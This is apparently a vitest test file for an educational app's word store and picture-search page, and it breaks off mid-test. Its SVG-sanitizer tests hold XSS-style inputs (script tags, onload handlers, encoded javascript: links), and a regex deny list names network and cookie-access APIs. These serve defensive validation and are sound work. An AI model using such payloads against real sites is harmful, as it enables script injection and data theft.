import { describe, expect, it } from 'vitest';
import { existsSync, readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { JSDOM } from 'jsdom';

// "My words" for AlloFlow Packets: what a teacher adds for a word (a split into sounds, a recording, a picture).
// Part 1: the device store (packets_my_words.js) against a small in-memory stand-in for IndexedDB.
// Part 2: its two helpers, resizeToDataUri (in a jsdom window with a stand-in canvas) and creditLine.
// Part 3: the page "Find a picture" (packets-pictures.html) read as files: its rule, its details strip, its wording.
// Part 4: the page run in jsdom with a stand-in fetch: nothing is asked for before the switch is on, pictures with
//         a closed license never reach the page, and a chosen picture lands in the store with its credit.
//
// packets-pictures.html is the ONE Packets page that may contact other websites. The rules in
// tests/packets_site_pages.test.js and tests/packets_verify_page.test.js that say a page connects to nothing cannot
// apply to it; this file holds the rules that replace them: the exact hosts, and that nothing is sent uninvited.
const require = createRequire(import.meta.url);
const read = (file) => readFileSync(file, 'utf8');
const myWords = require('../packets_my_words.js');
const pictures = require('../packets-pictures.js');

const NAME = 'AlloFlow Packets';
const PAGE = 'packets-pictures.html';
const SCRIPT = 'packets-pictures.js';
const STORE = 'packets_my_words.js';
const STYLES = 'packets-pictures.css';
const WRITTEN = [PAGE, SCRIPT, STORE, STYLES];
// The hosts the page may reach, and what each is for. The rule on the page must name exactly these.
const SEARCH_HOSTS = ['globalsymbols.com', 'api.openverse.org', 'commons.wikimedia.org'];
const PICTURE_HOSTS = ['globalsymbols.com', 'api.openverse.org', 'thumb.wikimedia.org', 'upload.wikimedia.org'];
const ALL_HOSTS = ['globalsymbols.com', 'api.openverse.org', 'commons.wikimedia.org', 'thumb.wikimedia.org', 'upload.wikimedia.org'];
const https = (hosts) => hosts.map((host) => 'https://' + host).join(' ');
const CSP = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: " + https(PICTURE_HOSTS) + '; connect-src ' + https(ALL_HOSTS) + "; form-action 'none'; base-uri 'none'";
const BRITISH = /practis|standardis|licence|colour|\bmarking\b|\bmarked\b|\btick(?:ed|s)?\b|USB stick|\bwhilst\b|\bmaths\b|favour|behaviour|\bcentre\b/i;
const addresses = (text) => text.match(/(?:https?:|wss?:)?\/\/[a-z0-9.-]+\.[a-z]{2,}[^\s"'<>)]*/gi) || [];

const b64 = (bytes, fill = 7) => Buffer.alloc(bytes, fill).toString('base64');
const png = (bytes) => 'data:image/png;base64,' + b64(bytes);
const jpeg = (bytes) => 'data:image/jpeg;base64,' + b64(bytes);
const wav = (bytes) => 'data:audio/wav;base64,' + b64(bytes);
const svgUri = (text) => 'data:image/svg+xml;base64,' + Buffer.from(text, 'utf8').toString('base64');
const PLAIN_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#3730a3"/></svg>';
const CREDIT = { title: 'Six weeks old cat', author: 'Ada Poe', license: 'CC BY-SA 2.5', licenseUrl: 'https://creativecommons.org/licenses/by-sa/2.5',
  source: 'Wikimedia Commons', sourceUrl: 'https://commons.wikimedia.org/wiki/File:Six_weeks_old_cat_(aka).jpg' };
const tick = () => new Promise((resolve) => setTimeout(resolve, 0));
const until = async (test, what) => {
  for (let i = 0; i < 400; i++) { if (test()) return; await tick(); }
  throw new Error('never happened: ' + what);
};
const refusal = async (promise) => { try { await promise; } catch (error) { return error; } return null; };

// ---------------------------------------------------------------------------------------------------------------
// A stand-in for IndexedDB, small and strict: object stores with a key path, transactions that see their own writes,
// commit when their requests are done and throw everything away when aborted, values copied in and out, and a
// read-only transaction that refuses to write. fake-indexeddb is not installed in this repository.
// ---------------------------------------------------------------------------------------------------------------
function fakeIndexedDB() {
  const databases = new Map();
  const idb = { full: false, opens: 0, transactions: [] };
  const named = (name) => Object.assign(new Error(name), { name });
  idb.open = (name, version) => {
    idb.opens++;
    const request = {};
    queueMicrotask(() => {
      let db = databases.get(name);
      const fresh = !db;
      if (fresh) { db = { stores: new Map(), version }; databases.set(name, db); }
      const handle = {
        objectStoreNames: { contains: (store) => db.stores.has(store) },
        createObjectStore(store, options) { db.stores.set(store, { keyPath: options.keyPath, rows: new Map() }); },
        close() {},
        transaction(names, mode) {
          const list = Array.isArray(names) ? names : [names];
          for (const store of list) if (!db.stores.has(store)) throw named('NotFoundError');
          const working = new Map(list.map((store) => [store, new Map(db.stores.get(store).rows)]));
          const tx = { mode: mode || 'readonly', error: null, pending: 0, over: false };
          idb.transactions.push({ names: list, mode: tx.mode });
          const finish = () => queueMicrotask(() => {
            if (tx.over || tx.pending) return;
            tx.over = true;
            for (const [store, rows] of working) db.stores.get(store).rows = rows;
            if (tx.oncomplete) tx.oncomplete({ target: tx });
          });
          const ask = (run) => {
            if (tx.over) throw named('TransactionInactiveError');
            const one = {};
            tx.pending++;
            queueMicrotask(() => {
              if (tx.over) return;
              try { one.result = run(); } catch (error) {
                tx.error = error; tx.over = true;
                if (one.onerror) one.onerror({ target: one, preventDefault() {} });
                if (tx.onabort) tx.onabort({ target: tx, preventDefault() {} });
                return;
              }
              if (one.onsuccess) one.onsuccess({ target: one });
              tx.pending--;
              finish();
            });
            return one;
          };
          const write = (run) => ask(() => {
            if (tx.mode !== 'readwrite') throw named('ReadOnlyError');
            if (idb.full) throw named('QuotaExceededError');
            return run();
          });
          tx.abort = () => { if (tx.over) throw named('InvalidStateError'); tx.over = true; queueMicrotask(() => tx.onabort && tx.onabort({ target: tx, preventDefault() {} })); };
          tx.objectStore = (store) => {
            if (!working.has(store)) throw named('NotFoundError');
            const rows = working.get(store), keyPath = db.stores.get(store).keyPath;
            return {
              get: (key) => ask(() => (rows.has(key) ? JSON.parse(rows.get(key)) : undefined)),
              getAll: () => ask(() => [...rows.keys()].sort().map((key) => JSON.parse(rows.get(key)))),
              count: () => ask(() => rows.size),
              put: (value) => write(() => { rows.set(value[keyPath], JSON.stringify(value)); return value[keyPath]; }),
              delete: (key) => write(() => { rows.delete(key); }),
              clear: () => write(() => { rows.clear(); }),
            };
          };
          finish();
          return tx;
        },
      };
      request.result = handle;
      if (fresh && request.onupgradeneeded) request.onupgradeneeded({ target: request });
      if (request.onsuccess) request.onsuccess({ target: request });
    });
    return request;
  };
  idb.peek = (store) => { const db = databases.get('alloflow-packets-my-words'); return db ? [...db.stores.get(store).rows.values()].map((row) => JSON.parse(row)) : []; };
  return idb;
}
// Tabs of one browser: every channel of a name hears the others, never itself.
function fakeChannels() {
  const open = [];
  return class FakeBroadcastChannel {
    constructor(name) { this.name = name; open.push(this); }
    postMessage(data) { const copy = JSON.parse(JSON.stringify(data)); for (const other of open) if (other !== this && other.name === this.name && other.onmessage) other.onmessage({ data: copy }); }
  };
}
const newStore = (env = {}) => myWords.create({ indexedDB: fakeIndexedDB(), ...env });

describe('the store: what a teacher adds for a word', () => {
  it('stores a word lower-case, letters only, 2 to 24 letters; a name longer than a dictionary word fits', () => {
    expect(myWords.normalizeWord('  Cat ')).toBe('cat');
    expect(myWords.normalizeWord('ALEXANDRIAMONTGOMERYSMITH')).toBe('');            // 25 letters
    expect(myWords.normalizeWord('Alexandriamontgomerysmit')).toBe('alexandriamontgomerysmit'); // 24 letters
    for (const bad of ['a', '', 'ice cream', "o'clock", 'cat2', 'caf' + String.fromCharCode(233), 'cat-nap', null, undefined, 7, {}, ['cat']]) expect(myWords.normalizeWord(bad), String(bad)).toBe('');
    expect(myWords.LIMITS).toMatchObject({ wordMin: 2, wordMax: 24, clipBytes: 400 * 1024, pictureBytes: 200 * 1024, pictureSide: 256, words: 500 });
  });

  it('put merges the parts, a null part removes that part, and a word with nothing left is removed', async () => {
    const store = newStore();
    expect(await store.available()).toBe(true);
    expect(await store.get('cat')).toBeNull();
    const first = await store.put(' Cat ', { sounds: ['k', 'a', 't'] });
    expect(first).toMatchObject({ word: 'cat', sounds: { sounds: ['k', 'a', 't'], alternates: [], source: 'teacher' } });
    expect(first.clip).toBeUndefined();
    // A second put adds a part and leaves the first alone.
    await store.put('cat', { clip: { dataUri: wav(2000), source: 'teacher', made: '2026-11-11T10:00:00.000Z', ms: 640.4 } });
    await store.put('CAT', { picture: { dataUri: png(3000), credit: CREDIT } });
    const whole = await store.get('cat');
    expect(Object.keys(whole).sort()).toEqual(['clip', 'picture', 'sounds', 'updated', 'word']);
    expect(whole.clip).toEqual({ dataUri: wav(2000), source: 'teacher', made: '2026-11-11T10:00:00.000Z', ms: 640, bytes: 2000 });
    expect(whole.picture.dataUri).toBe(png(3000));
    expect(whole.picture.bytes).toBe(3000);
    expect(whole.picture.credit).toEqual(CREDIT);
    expect(new Date(whole.updated).toISOString()).toBe(whole.updated);
    // A part left out is kept; undefined is the same as left out; null removes.
    await store.put('cat', { clip: null, picture: undefined, sounds: undefined, other: 'ignored' }).catch(() => {});
    const less = await store.put('cat', { clip: null });
    expect(Object.keys(less).sort()).toEqual(['picture', 'sounds', 'updated', 'word']);
    expect(await store.put('cat', { sounds: null })).toMatchObject({ word: 'cat', picture: { bytes: 3000 } });
    // The last part goes: the word goes with it.
    expect(await store.put('cat', { picture: null })).toBeNull();
    expect(await store.get('cat')).toBeNull();
    expect(await store.list()).toEqual([]);
  });

  it('keeps the sounds in the shape the word core uses, and the letters for each sound when they are given', async () => {
    const store = newStore();
    // What word_sounds_core.js returns for these words: dictionarySounds(word) and alignGraphemes(word, sounds).
    const cake = { sounds: ['k', 'ay', 'k'], alternates: [], source: 'dictionary',
      spelling: [{ text: 'c', start: 0, size: 1, at: 0 }, { text: 'a', start: 1, size: 1, at: 1 }, { text: 'ke', start: 2, size: 1, at: 2, silentE: true }] };
    const fox = { sounds: ['f', 'o', 'k', 's'], spelling: [{ text: 'f', start: 0, size: 1, at: 0 }, { text: 'o', start: 1, size: 1, at: 1 }, { text: 'x', start: 2, size: 2, at: 2 }] };
    expect((await store.put('cake', { sounds: cake })).sounds).toEqual({ ...cake, source: 'teacher' });
    expect((await store.put('fox', { sounds: fox })).sounds).toEqual({ ...fox, alternates: [], source: 'teacher' });
    expect((await store.put('ship', { sounds: { sounds: ['sh', 'i', 'p'], alternates: [['s', 'i', 'p'], 'junk', []] } })).sounds).toEqual({ sounds: ['sh', 'i', 'p'], alternates: [['s', 'i', 'p']], source: 'teacher' });
    expect((await store.put('book', { sounds: ['b', 'oo_short', 'k'] })).sounds.sounds).toEqual(['b', 'oo_short', 'k']);
    // Letters that do not spell the word, a count that does not match, or a label that is not a sound: refused.
    const bad = [
      { sounds: [] }, { sounds: ['K', 'a', 't'] }, { sounds: ['k', 'a', 7] }, { sounds: 'kat' }, 'kat', 7,
      { sounds: new Array(25).fill('a') },
      { sounds: ['k', 'a', 't'], spelling: [{ text: 'k', size: 1 }, { text: 'a', size: 1 }, { text: 't', size: 1 }] },      // spells "kat"
      { sounds: ['k', 'a', 't'], spelling: [{ text: 'ca', size: 1 }, { text: 't', size: 1 }] },                             // two groups, three sounds
      { sounds: ['k', 'a', 't'], spelling: [] }, { sounds: ['k', 'a', 't'], spelling: [{ text: '<b>', size: 1 }] },
    ];
    for (const sounds of bad) expect((await refusal(store.put('cat', { sounds })))?.code, JSON.stringify(sounds)).toBe('bad_sounds');
    expect(await store.get('cat')).toBeNull();
  });

  it('list gives one small row for each word with its parts and sizes, getMany the entries asked for, usage the total', async () => {
    const idb = fakeIndexedDB();
    const store = myWords.create({ indexedDB: idb });
    await store.put('sun', { picture: { dataUri: jpeg(5000), credit: { own: true } } });
    await store.put('cat', { clip: { dataUri: wav(8000), source: 'computer-voice', ms: 500 }, picture: { dataUri: png(3000), credit: CREDIT } });
    await store.put('ship', { sounds: ['sh', 'i', 'p'] });
    const rows = await store.list();
    expect(rows.map((row) => row.word)).toEqual(['cat', 'ship', 'sun']);
    expect(rows[0]).toMatchObject({ word: 'cat', sounds: false, clip: true, picture: true, own: false, clipBytes: 8000, pictureBytes: 3000, bytes: 11000 });
    expect(rows[1]).toMatchObject({ word: 'ship', sounds: true, clip: false, picture: false, clipBytes: 0, pictureBytes: 0 });
    expect(rows[2]).toMatchObject({ word: 'sun', picture: true, own: true, pictureBytes: 5000 });
    expect(JSON.stringify(rows)).not.toContain('base64');
    const usage = await store.usage();
    expect(usage.count).toBe(3);
    expect(usage.bytes).toBe(rows.reduce((sum, row) => sum + row.bytes, 0));
    expect(usage.bytes).toBeGreaterThan(16000);
    // list and usage read the small rows only, never the store that holds the files.
    idb.transactions.length = 0;
    await store.list(); await store.usage();
    expect(idb.transactions).toEqual([{ names: ['rows'], mode: 'readonly' }, { names: ['rows'], mode: 'readonly' }]);
    const many = await store.getMany(['CAT', 'dog', 'sun', 'sun', 'not a word', 7]);
    expect(Object.keys(many).sort()).toEqual(['cat', 'sun']);
    expect(many.sun.picture.credit).toEqual({ own: true });
    expect(await store.getMany('cat')).toEqual({});
    // remove says whether the word was there; clear says how many there were.
    expect(await store.remove('Sun')).toBe(true);
    expect(await store.remove('sun')).toBe(false);
    expect(await store.remove('7')).toBe(false);
    expect(await store.clear()).toBe(2);
    expect(await store.clear()).toBe(0);
    expect(await store.usage()).toEqual({ count: 0, bytes: 0 });
    expect(idb.peek('words')).toEqual([]);
    expect(idb.peek('rows')).toEqual([]);
  });

  it('holds its limits: a clip of 400 KB and a picture of 200 KB at most, and nothing is written when a part is refused', async () => {
    const idb = fakeIndexedDB();
    const store = myWords.create({ indexedDB: idb });
    await store.put('cat', { sounds: ['k', 'a', 't'] });
    const before = JSON.stringify(idb.peek('words'));
    expect((await store.put('sun', { clip: { dataUri: wav(409600) } })).clip.bytes).toBe(409600);
    expect((await store.put('sun', { picture: { dataUri: png(204800), credit: { own: true } } })).picture.bytes).toBe(204800);
    await store.remove('sun');
    const cases = [
      ['clip_too_big', { clip: { dataUri: wav(409601) } }],
      ['picture_too_big', { picture: { dataUri: png(204801), credit: { own: true } } }],
      ['bad_clip', { clip: { dataUri: png(100) } }],
      ['bad_clip', { clip: { dataUri: 'data:audio/wav,plain text' } }],
      ['bad_clip', { clip: { dataUri: 'data:audio/wav;base64,not base64!' } }],
      ['bad_clip', { clip: { dataUri: 'https://example.org/cat.wav' } }],
      ['bad_clip', { clip: 'data:audio/wav;base64,AAAA' }],
      ['bad_picture', { picture: { dataUri: wav(100), credit: { own: true } } }],
      ['bad_picture', { picture: { dataUri: 'data:image/gif;base64,' + b64(90), credit: { own: true } } }],
      ['bad_picture', { picture: { dataUri: 'data:text/html;base64,' + b64(90), credit: { own: true } } }],
      ['bad_picture', { picture: { dataUri: 'blob:https://example.org/1', credit: { own: true } } }],
      // A picture must say whose it is: the teacher's own, or a credit with a stated license.
      ['bad_picture', { picture: { dataUri: png(100) } }],
      ['bad_picture', { picture: { dataUri: png(100), credit: { title: 'Cat', author: 'Ada Poe' } } }],
      ['bad_picture', { picture: { dataUri: png(100), credit: { title: 'Cat', license: '   ' } } }],
      ['bad_picture', { picture: { dataUri: png(100), credit: 'CC BY 4.0' } }],
      // A good part beside a bad one: neither is written.
      ['clip_too_big', { picture: { dataUri: png(100), credit: { own: true } }, clip: { dataUri: wav(500000) } }],
      ['bad_part', {}], ['bad_part', { other: 1 }], ['bad_part', null], ['bad_part', 'cat'],
    ];
    for (const [code, patch] of cases) {
      const error = await refusal(store.put('cat', patch));
      expect(error?.code, JSON.stringify(patch).slice(0, 90)).toBe(code);
      expect(error.message).toMatch(/^[A-Z].*\.$/);
    }
    for (const word of ['a', '', 'ice cream', 'x'.repeat(25), null]) expect((await refusal(store.put(word, { sounds: ['a'] })))?.code).toBe('bad_word');
    expect(JSON.stringify(idb.peek('words'))).toBe(before);
    expect((await store.list()).map((row) => row.word)).toEqual(['cat']);
  });

  it('keeps only known fields of a clip and a credit, and an address in a credit only when it is an https address', async () => {
    const store = newStore();
    const entry = await store.put('cat', {
      clip: { dataUri: 'data:audio/webm;codecs=opus;base64,' + b64(600), source: 'someone', made: 'not a date', ms: -4, extra: 'x' },
      picture: { dataUri: jpeg(900), extra: 'x', credit: { title: '  Cat\n in  a hat ', author: 'A'.repeat(300), license: 'CC BY 4.0', licenseUrl: 'javascript:alert(1)',
        source: 'Openverse', sourceUrl: 'http://example.org/cat', resized: 'yes', own: false, extra: 'x' } },
    });
    expect(Object.keys(entry.clip).sort()).toEqual(['bytes', 'dataUri', 'made', 'ms', 'source']);
    expect(entry.clip.source).toBe('teacher');
    expect(entry.clip.ms).toBe(0);
    expect(new Date(entry.clip.made).toISOString()).toBe(entry.clip.made);
    expect(Object.keys(entry.picture).sort()).toEqual(['bytes', 'credit', 'dataUri', 'made']);
    expect(entry.picture.credit).toEqual({ title: 'Cat in a hat', author: 'A'.repeat(200), license: 'CC BY 4.0', licenseUrl: '', source: 'Openverse', sourceUrl: '' });
    const kept = await store.put('sun', { picture: { dataUri: png(50), credit: { ...CREDIT, resized: true } } });
    expect(kept.picture.credit).toEqual({ ...CREDIT, resized: true });
    expect((await store.put('sun', { clip: { dataUri: wav(50), source: 'computer-voice' } })).clip.source).toBe('computer-voice');
  });

  it('keeps an SVG picture only when it is a plain drawing: no script, no outside reference, no event handler', async () => {
    const store = newStore();
    expect((await store.put('sun', { picture: { dataUri: svgUri(PLAIN_SVG), credit: CREDIT } })).picture.dataUri).toBe(svgUri(PLAIN_SVG));
    const unsafe = [
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="4"/></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://example.org/track.png"/></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><circle r="4"/></a></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><p>hi</p></foreignObject></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><style>@import "https://example.org/a.css";</style></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://example.org/p.svg#a)"/></svg>',
      '<p>not a drawing</p>',
    ];
    for (const svg of unsafe) {
      expect(myWords.svgRefusal(svg), svg).not.toBe('');
      expect((await refusal(store.put('cat', { picture: { dataUri: svgUri(svg), credit: CREDIT } })))?.code, svg).toBe('bad_picture');
    }
    expect(await store.get('cat')).toBeNull();
  });

  it('applies the same SVG test as the packet builder, rule for rule', () => {
    const builder = require('../word_sounds_packet_builder.js');
    const samples = [PLAIN_SVG, '<svg><use href="#a"/><path id="a" d="M0 0"/></svg>', '<svg><rect fill="url(#g)"/></svg>', '<svg><style>.a{fill:red}</style></svg>',
      '<svg><script>1</script></svg>', '<svg><SCRIPT>1</SCRIPT></svg>', '<svg onload="x()"></svg>', '<svg><a href="https://example.org"></a></svg>', '<svg><a xlink:href="data:text/html,x"></a></svg>',
      '<svg><image src="x.png"/></svg>', '<svg><foreignObject/></svg>', '<svg><animate attributeName="x"/></svg>', '<svg><set/></svg>', '<svg><style>@font-face{}</style></svg>',
      '<svg><a href="java&#115;cript:x"></a></svg>', '<svg><a href="jav&#x61;script:x"></a></svg>', '<svg xml:base="https://example.org/"></svg>', '<!DOCTYPE svg><svg></svg>',
      '<?xml version="1.0"?><svg></svg>', '<svg><?php x ?></svg>', '<svg>\\</svg>', '<svg><rect style="fill:url(x.svg#a)"/></svg>', '<svg><style>a{}', 'text', '', '<svg>' + 'x'.repeat(300001) + '</svg>'];
    for (const svg of samples) expect(myWords.svgRefusal(svg), svg.slice(0, 60)).toBe(builder.svgRefusal(svg));
    expect(samples.filter((svg) => myWords.svgRefusal(svg) === '').length).toBe(4);
    for (const junk of [null, undefined, 7, {}, []]) expect(myWords.svgRefusal(junk)).toBe('not an SVG drawing');
  });

  it('keeps at most 500 words, and says so in plain words', async () => {
    const idb = fakeIndexedDB();
    const store = myWords.create({ indexedDB: idb });
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    for (let i = 0; i < 500; i++) await store.put('w' + letters[Math.floor(i / 26)] + letters[i % 26], { sounds: ['a'] });
    expect((await store.usage()).count).toBe(500);
    const error = await refusal(store.put('extra', { sounds: ['a'] }));
    expect(error.code).toBe('too_many_words');
    expect(error.message).toBe('This browser keeps at most 500 words. Remove some to add more.');
    expect(await store.get('extra')).toBeNull();
    // A word that is already there can still be changed.
    expect((await store.put('waa', { sounds: ['b'] })).sounds.sounds).toEqual(['b']);
    expect(idb.peek('words').length).toBe(500);
  });

  it('when the browser blocks storage: no method throws, reads come back empty, put is refused, and the page can say so', async () => {
    const securityError = Object.assign(new Error('The operation is insecure.'), { name: 'SecurityError' });
    const blocked = {
      'no indexedDB at all': {},
      'indexedDB that throws when read': Object.defineProperty({}, 'indexedDB', { get() { throw securityError; } }),
      'open that throws': { indexedDB: { open() { throw securityError; } } },
      'open that fails': { indexedDB: { open() { const request = {}; queueMicrotask(() => request.onerror && request.onerror({ preventDefault() {} })); return request; } } },
      'a database that refuses a transaction': { indexedDB: { open() { const request = {}; queueMicrotask(() => { request.result = { objectStoreNames: { contains: () => true }, transaction() { throw securityError; } }; request.onsuccess({ target: request }); }); return request; } } },
    };
    for (const [what, env] of Object.entries(blocked)) {
      const store = myWords.create(env);
      const calls = () => [store.available(), store.get('cat'), store.getMany(['cat', 'sun']), store.list(), store.usage(), store.remove('cat'), store.clear(), store.put('cat', { sounds: ['k', 'a', 't'] })];
      let made;
      expect(() => { made = calls(); }, what).not.toThrow();
      for (const call of made) expect(typeof call.then, what).toBe('function');
      const results = await Promise.allSettled(made);
      expect(results.slice(0, 7).map((result) => result.value), what).toEqual([false, null, {}, [], { count: 0, bytes: 0 }, false, 0]);
      expect(results[7].status, what).toBe('rejected');
      expect(results[7].reason.code, what).toBe('no_storage');
      expect(results[7].reason.message, what).toBe('This browser is not keeping your words.');
      expect(() => store.onChange(() => {})(), what).not.toThrow();
    }
    expect(myWords.NOT_KEEPING).toBe('This browser is not keeping your words.');
    // The object a page gets with a plain require has no database here: the same answers.
    expect(await myWords.create({}).available()).toBe(false);
  });

  it('a device with no room left: the put is refused with a plain reason and what was there stays', async () => {
    const idb = fakeIndexedDB();
    const store = myWords.create({ indexedDB: idb });
    await store.put('cat', { sounds: ['k', 'a', 't'] });
    idb.full = true;
    const error = await refusal(store.put('cat', { picture: { dataUri: png(900), credit: { own: true } } }));
    expect(error.code).toBe('storage_full');
    expect(error.message).toBe('This device has no room left for this site. Remove some words, or free some space.');
    idb.full = false;
    expect(Object.keys(await store.get('cat')).sort()).toEqual(['sounds', 'updated', 'word']);
    expect((await store.list())[0]).toMatchObject({ word: 'cat', picture: false });
  });

  it('a failed try at opening is not remembered: storage that comes back is used', async () => {
    const real = fakeIndexedDB();
    const env = { indexedDB: { open() { throw new Error('blocked for now'); } } };
    const store = myWords.create(env);
    expect(await store.available()).toBe(false);
    env.indexedDB = real;
    expect(await store.available()).toBe(true);
    expect((await store.put('cat', { sounds: ['k', 'a', 't'] })).word).toBe('cat');
    // One database is opened and shared by every call after that.
    await store.get('cat'); await store.list(); await store.usage();
    expect(real.opens).toBe(1);
  });

  it('tells the other open tabs after put, remove and clear, and this tab too', async () => {
    const Channel = fakeChannels();
    const idb = fakeIndexedDB();
    const maker = myWords.create({ indexedDB: idb, BroadcastChannel: Channel });
    const finder = myWords.create({ indexedDB: idb, BroadcastChannel: Channel });
    const heardByMaker = [], heardByFinder = [];
    const stop = maker.onChange((change) => heardByMaker.push(change));
    finder.onChange((change) => heardByFinder.push(change));
    finder.onChange(() => { throw new Error('a listener that breaks does not stop the others'); });
    await finder.put('Cat', { picture: { dataUri: png(100), credit: { own: true } } });
    expect(heardByMaker).toEqual([{ word: 'cat', action: 'put', here: false }]);
    expect(heardByFinder).toEqual([{ word: 'cat', action: 'put', here: true }]);
    // The maker reads the new picture from the same database.
    expect((await maker.get('cat')).picture.credit).toEqual({ own: true });
    await finder.put('cat', { picture: null });
    await finder.put('sun', { sounds: ['s', 'u', 'n'] });
    await finder.remove('sun');
    await finder.remove('sun');                       // not there: nothing to tell
    await finder.put('sun', { sounds: ['s', 'u', 'n'] });
    await finder.clear();
    await finder.clear();                             // already empty: nothing to tell
    await refusal(finder.put('cat', { clip: { dataUri: 'junk' } }));   // refused: nothing to tell
    expect(heardByMaker.slice(1)).toEqual([
      { word: 'cat', action: 'remove', here: false }, { word: 'sun', action: 'put', here: false }, { word: 'sun', action: 'remove', here: false },
      { word: 'sun', action: 'put', here: false }, { word: '', action: 'clear', here: false },
    ]);
    stop();
    await finder.put('sun', { sounds: ['s', 'u', 'n'] });
    expect(heardByMaker.length).toBe(6);
    expect(heardByFinder.length).toBe(7);
  });

  it('with no BroadcastChannel, wakes the other tabs with a storage event that holds no word', async () => {
    const writes = [];
    const listeners = [];
    const idb = fakeIndexedDB();
    const tab = (name) => ({ indexedDB: idb, localStorage: { setItem: (key, value) => writes.push([name, 'set', key, value]), removeItem: (key) => writes.push([name, 'remove', key]) },
      addEventListener: (type, listener) => listeners.push([name, type, listener]) });
    const finder = myWords.create(tab('finder')), maker = myWords.create(tab('maker'));
    const heard = [];
    maker.onChange((change) => heard.push(change));
    await finder.put('alexandria', { sounds: ['a'] });
    expect(writes.map((write) => write.slice(0, 3))).toEqual([['finder', 'set', 'alloflow-packets-my-words/changed'], ['finder', 'remove', 'alloflow-packets-my-words/changed']]);
    expect(writes[0][3]).toMatch(/^\d+\.\d+$/);
    expect(JSON.stringify(writes)).not.toContain('alexandria');
    // The browser hands the event to the other tab.
    const [, type, listener] = listeners.find(([name]) => name === 'maker');
    expect(type).toBe('storage');
    listener({ key: 'alloflow-packets-my-words/changed', newValue: writes[0][3] });
    listener({ key: 'alloflow-packets-my-words/changed', newValue: null });   // the removal: no second wake
    listener({ key: 'something-else', newValue: '1' });
    expect(heard).toEqual([{ word: '', action: '', here: false }]);
    // Storage that throws does not stop a put.
    const strict = myWords.create({ indexedDB: fakeIndexedDB(), localStorage: { setItem() { throw new Error('denied'); }, removeItem() {} } });
    expect((await strict.put('cat', { sounds: ['k', 'a', 't'] })).word).toBe('cat');
  });

  it('is one plain script with a documented contract, and reaches nothing', () => {
    const text = read(STORE);
    expect(text).not.toMatch(/\bfetch\b|XMLHttpRequest|WebSocket|EventSource|sendBeacon|\bimport\s*\(|\.\s*cookie\b|getUserMedia|serviceWorker|innerHTML|outerHTML|insertAdjacentHTML|document\.write|\beval\s*\(|new\s+Function|sessionStorage/);
    expect(addresses(text)).toEqual([]);
    expect(text).not.toContain('https://');
    // The header is what the next page builder reads: every method and helper is named in it.
    const header = text.slice(0, text.indexOf('(function (root) {'));
    for (const name of ['available()', 'get(word)', 'getMany(words)', 'put(word, patch)', 'remove(word)', 'list()', 'clear()', 'usage()', 'onChange(', 'resizeToDataUri(source, maxSide)', 'creditLine(credit)',
      'normalizeWord', 'svgRefusal', 'dataUriBytes', 'LIMITS', 'NOT_KEEPING', '400 KB', '200 KB', '256 pixels', '500 words', '2 to 24 letters', 'no_storage', 'BroadcastChannel', 'storage event',
      'This browser is not keeping your words.', "'alloflow-packets-my-words'"]) expect(header, name).toContain(name);
    expect(header.split('\n').filter(Boolean).every((line) => line.startsWith('//'))).toBe(true);
    for (const name of ['available', 'get', 'getMany', 'put', 'remove', 'list', 'clear', 'usage', 'onChange', 'create', 'normalizeWord', 'svgRefusal', 'dataUriBytes', 'resizeToDataUri', 'creditLine']) expect(typeof myWords[name], name).toBe('function');
    expect(myWords.dataUriBytes(png(1234))).toBe(1234);
    expect(myWords.dataUriBytes('data:image/png;base64,AAA')).toBe(-1);
    expect(myWords.dataUriBytes('cat')).toBe(-1);
  });
});

// ---------------------------------------------------------------------------------------------------------------
// The two helpers. resizeToDataUri runs in a jsdom window whose canvas, image and bitmap are stand-ins that record
// what was drawn and at what size: jsdom draws nothing.
// ---------------------------------------------------------------------------------------------------------------
function standInCanvas(window, options = {}) {
  const log = { draws: [], made: [], images: [], bitmaps: 0, closed: 0 };
  window.HTMLCanvasElement.prototype.getContext = function () {
    const canvas = this;
    const context = { fillRect() { canvas.white = true; }, drawImage(source, sx, sy, sw, sh, dx, dy, dw, dh) { log.draws.push({ sw, sh, dw, dh }); } };
    // options.dots: 'solid' (every dot opaque) or 'clear' (some see-through). Left out: the browser cannot say.
    if (options.dots) context.getImageData = (x, y, w, h) => ({ data: new Uint8ClampedArray(w * h * 4).fill(options.dots === 'solid' ? 255 : 0) });
    return context;
  };
  window.HTMLCanvasElement.prototype.toDataURL = function (type = 'image/png', quality) {
    if (options.tainted) throw Object.assign(new Error('Tainted canvases may not be exported.'), { name: 'SecurityError' });
    log.made.push({ type, quality, width: this.width, height: this.height, white: !!this.white });
    const bytes = options.bytes ? options.bytes(type, quality) : 1500;
    return 'data:' + type + ';base64,' + b64(bytes);
  };
  if (options.bitmap !== null) window.createImageBitmap = (blob) => { log.bitmaps++; return options.bitmap ? Promise.resolve({ ...options.bitmap, close() { log.closed++; } }) : Promise.reject(new Error('cannot decode')); };
  window.Image = function () {
    const image = { naturalWidth: options.image ? options.image.width : 0, naturalHeight: options.image ? options.image.height : 0 };
    Object.defineProperty(image, 'src', { set(address) { log.images.push(address); queueMicrotask(() => (options.image === null ? image.onerror && image.onerror() : image.onload && image.onload())); } });
    return image;
  };
  return log;
}
function helperWindow(options) {
  const { window } = new JSDOM('<!doctype html><title>t</title>', { runScripts: 'outside-only', url: 'https://packets.test/' });
  const log = standInCanvas(window, options);
  window.eval(read(STORE));
  return { window, log, store: window.AlloPacketMyWords, file: (parts, name, type) => new window.File(parts, name, { type }) };
}

describe('resizeToDataUri: a picture, made small', () => {
  it('a photo comes back as a JPEG at most 256 pixels on its long side, drawn down in steps', async () => {
    const { store, log, file } = helperWindow({ bitmap: { width: 4000, height: 3000 } });
    const uri = await store.resizeToDataUri(file([new Uint8Array(5000)], 'cat.jpg', 'image/jpeg'), 256);
    expect(uri.startsWith('data:image/jpeg;base64,')).toBe(true);
